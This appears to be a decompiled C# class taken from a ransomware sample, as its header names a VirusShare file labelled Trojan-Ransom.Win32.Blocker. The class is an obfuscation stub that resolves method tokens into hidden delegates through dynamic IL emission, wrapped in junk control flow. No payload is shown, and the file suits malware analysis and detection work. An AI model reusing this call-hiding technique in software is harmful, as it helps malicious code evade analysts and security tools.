// Decompiled with JetBrains decompiler
// Type: A.c03a639f2240dd22482d5c2ab40cd4b89
// Assembly: encrypted, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8081A28B-F501-41E9-8C50-91279EE18641
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aqzw-6bbce56e7d8becb81cd60e57252cb62ea691536669ee9ad99732f11b46da2634.exe

using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;

namespace A
{
  internal sealed class c03a639f2240dd22482d5c2ab40cd4b89
  {
    private static readonly int c8363b2e9626696d874f78cf9b378f73c;
    private static readonly int cc3bcd944d230aaec3697d095266c7f3f;
    private static readonly int c6d9c732638105e22585d9d41b2308404;
    private static readonly int c5876e28a878e63d208c9e707b7f02a20;
    private static readonly int c6ff72e2faac8026c01c3234acd81c53d;
    private static readonly int c6af88fd641a857fbd951e8d779310bb7;
    private static readonly int c5f4ab244d745c16c35e3f3a92a21a91f;
    private static readonly int cd426b594299253e2453d52888e1ffc46;
    private static readonly int cd5cba5067bd95679f244972ecc18586a;
    private static readonly int c9848f1598bc647d12dd6751657ea3e3e;
    private static readonly int c8a1904538dfe9b8a754c0719ba76f0a8;
    private static readonly int c45455cf8232ecb0e7c428a95b4202b7a;
    private static readonly int caca3fc1d6c0af3206aa7db0fcc0e0c31;
    private static readonly int c49d9e5a0fb085ad15663404d4a3a7f81;
    private static readonly ModuleHandle c0b5e10e759a269c950c7086a19d69993;

    static c03a639f2240dd22482d5c2ab40cd4b89()
    {
      if ((object) typeof (MulticastDelegate) == null)
        return;
label_1:
      switch (4)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (c03a639f2240dd22482d5c2ab40cd4b89.\u002Ecctor);
          }
          c03a639f2240dd22482d5c2ab40cd4b89.c0b5e10e759a269c950c7086a19d69993 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
          break;
      }
    }

    [SpecialName]
    private int get_c31cb288107b1c5facb909a0c99362f94() => 1;

    public static void c013f5d959e5e5211744406b8b00b747a(int _param0, int _param1, int _param2)
    {
      Type typeFromHandle;
      MethodInfo method;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(c03a639f2240dd22482d5c2ab40cd4b89.c0b5e10e759a269c950c7086a19d69993.ResolveTypeHandle(_param0));
        object methodFromHandle;
        if (_param2 == 16777215)
        {
label_1:
          switch (5)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (c03a639f2240dd22482d5c2ab40cd4b89.c013f5d959e5e5211744406b8b00b747a);
              }
              methodFromHandle = (object) MethodBase.GetMethodFromHandle(c03a639f2240dd22482d5c2ab40cd4b89.c0b5e10e759a269c950c7086a19d69993.ResolveMethodHandle(_param1));
              break;
          }
        }
        else
          methodFromHandle = (object) MethodBase.GetMethodFromHandle(c03a639f2240dd22482d5c2ab40cd4b89.c0b5e10e759a269c950c7086a19d69993.ResolveMethodHandle(_param1), c03a639f2240dd22482d5c2ab40cd4b89.c0b5e10e759a269c950c7086a19d69993.ResolveTypeHandle(_param2));
        method = (MethodInfo) methodFromHandle;
      }
      catch (Exception ex)
      {
        throw;
      }
      foreach (FieldInfo field in typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
      {
        try
        {
          Delegate @delegate;
          if (method.IsStatic)
          {
label_11:
            switch (7)
            {
              case 0:
                goto label_11;
              default:
                @delegate = Delegate.CreateDelegate(field.FieldType, method);
                break;
            }
          }
          else
          {
            ParameterInfo[] parameters = method.GetParameters();
            int length = parameters.Length + 1;
            Type[] parameterTypes = new Type[length];
            if (method.DeclaringType.IsValueType)
            {
label_14:
              switch (3)
              {
                case 0:
                  goto label_14;
                default:
                  parameterTypes[0] = method.DeclaringType.MakeByRefType();
                  break;
              }
            }
            else
              parameterTypes[0] = typeof (object);
            for (int index = 1; index < length; ++index)
              parameterTypes[index] = parameters[index - 1].ParameterType;
label_20:
            switch (2)
            {
              case 0:
                goto label_20;
              default:
                DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, method.ReturnType, parameterTypes, typeFromHandle, true);
                ILGenerator ilGenerator1 = dynamicMethod.GetILGenerator();
                ilGenerator1.Emit(OpCodes.Ldarg_0);
                if (length > 1)
                {
label_22:
                  switch (2)
                  {
                    case 0:
                      goto label_22;
                    default:
                      ilGenerator1.Emit(OpCodes.Ldarg_1);
                      break;
                  }
                }
                if (length > 2)
                {
label_25:
                  switch (2)
                  {
                    case 0:
                      goto label_25;
                    default:
                      ilGenerator1.Emit(OpCodes.Ldarg_2);
                      break;
                  }
                }
                if (length > 3)
                {
label_28:
                  switch (1)
                  {
                    case 0:
                      goto label_28;
                    default:
                      ilGenerator1.Emit(OpCodes.Ldarg_3);
                      break;
                  }
                }
                if (length > 4)
                {
                  for (int index = 4; index < length; ++index)
                    ilGenerator1.Emit(OpCodes.Ldarg_S, index);
label_34:
                  switch (7)
                  {
                    case 0:
                      goto label_34;
                  }
                }
                ILGenerator ilGenerator2 = ilGenerator1;
                OpCode opcode;
                if (!field.IsFamilyOrAssembly)
                {
label_36:
                  switch (3)
                  {
                    case 0:
                      goto label_36;
                    default:
                      opcode = OpCodes.Call;
                      break;
                  }
                }
                else
                  opcode = OpCodes.Callvirt;
                MethodInfo meth = method;
                ilGenerator2.Emit(opcode, meth);
                ilGenerator1.Emit(OpCodes.Ret);
                @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
                break;
            }
          }
          field.SetValue((object) null, (object) @delegate);
        }
        catch (Exception ex)
        {
        }
      }
    }
  }
}
